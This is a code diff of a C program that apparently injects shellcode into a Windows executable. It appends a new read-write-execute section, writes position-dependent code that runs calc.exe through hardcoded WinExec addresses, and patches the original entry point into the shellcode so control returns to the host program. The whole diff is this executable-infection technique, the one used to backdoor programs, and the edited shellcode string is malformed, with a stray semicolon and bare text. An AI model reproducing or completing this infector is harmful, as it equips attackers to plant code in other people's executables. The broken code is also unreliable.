@@ -20,24 +20,28 @@ int main(int argc, char *argv[]) {
 
 	/*
 	 * Shellcode JMP EntrypointRedirection
-	 * E9 DWORD : Jump near, relative, displacement relative to next instruction
+	 * BB DWORD : Jump absolute
 	 */
 	char shellcode[] =
-"\xEB\x16"             //JMP SHORT 0x16
-"\x5B"                 //POP EBX
-"\x31\xC0"             //XOR EAX,EAX
-"\x50"                 //PUSH EAX
-"\x53"                 //PUSH EBX
-"\xBB\xF1\x2F\x4D\x76" //MOV EBX, 0x75AD2FF1 ;kernel32.dll WinExec
-"\xFF\xD3"             //CALL EBX
-"\x31\xC0"             //XOR EAX,EAX
-"\x50"                 //PUSH EAX
-"\xBB\xD8\x79\x45\x76" //MOV EBX,75A579D8 ;kernel32.dll ExitProcess
-"\xFF\xD3"             //CALL EBX
-"\xE8\xE5\xFF\xFF\xFF" //CALL 0xE5FFFFFF
-"\x63\x61\x6C\x63\x2E\x65\x78\x65"; //ASCII "calc.exe", 0x00
-//"\xE9"; //Jump short EOP ~ need enable Write EOP
+"\xEB\x13"
+"\x5B"
+"\x31\xC0"
+"\x50"
+"\x53"
+"\xBB\xF1\x2F\x4D\x76"; kernel32.dll WinExec
+"\xFF\xD3"
+"\xBB"
 
+//19 bytes to modifiy EOP
+"\xFF\xFF\xFF\xFF" // This is the EOP
+
+"\xFF\xE3"
+"\xE8\xE8\xFF\xFF\xFF"
+"\x63\x61\x6C"
+"\x63\x2E"
+"\x65\x78\x65";
+
+	DWORD pEOP = 15;
 	DWORD sizeofshellcode = strlen(shellcode) * sizeof(char);
 
 	/*
@@ -61,6 +65,7 @@ int main(int argc, char *argv[]) {
 	 * Copy last section
 	 */
 	ownSection = hSection;
+
 	/*
 	 * Craft own section
 	 */
@@ -75,7 +80,7 @@ int main(int argc, char *argv[]) {
 			hSection.PointerToRawData + hSection.SizeOfRawData);
 
 	/*
-	 * Put privilege of the section
+	 * Privilege Section
 	 */
 	ownSection.Characteristics = IMAGE_SCN_MEM_WRITE + IMAGE_SCN_MEM_READ
 			+ IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_SHARED + IMAGE_SCN_CNT_CODE;
@@ -98,19 +103,23 @@ int main(int argc, char *argv[]) {
 	WriteFile(hFile, &shellcode, sizeofshellcode, &dwTaille, NULL);
 
 	/*
-	 * Calculate and Write Original AddressOfEntryPoint
-	 * Original AddressOfEntryPoint is less than VirtualAddress of the own section
-	 * This is a relative jump
+	 * Write Original AddressOfEntryPoint
+	 * Into shellcode, his location is at pEOP
+	 */
+	DWORD EntryOriginalPoint = hNT.OptionalHeader.AddressOfEntryPoint + hNT.OptionalHeader.ImageBase;
 
-	DWORD EntryPointRedirection = hNT.OptionalHeader.AddressOfEntryPoint
-			- ownSection.VirtualAddress - sizeofshellcode - sizeof(DWORD);
-	WriteFile(hFile, &EntryPointRedirection, sizeof(DWORD), &dwTaille, NULL);
-	*/
+	SetFilePointer(hFile, ownSection.PointerToRawData + pEOP, 0, FILE_BEGIN);
+	WriteFile(hFile, &EntryOriginalPoint, sizeof(DWORD), &dwTaille, NULL);
+
+	/*
+	 * Go to end of shellcode
+	 */
+	SetFilePointer(hFile, ownSection.PointerToRawData + sizeofshellcode, 0, FILE_BEGIN);
 
 	/*
 	 * Write pattern to fill empty
 	 */
-	for (i = 0; i < ownSection.SizeOfRawData - sizeofshellcode;
+	 for (i = 0; i < ownSection.SizeOfRawData - sizeofshellcode;
 			i++)
 		WriteFile(hFile, &pattern, sizeof(char), &dwTaille, NULL);
 
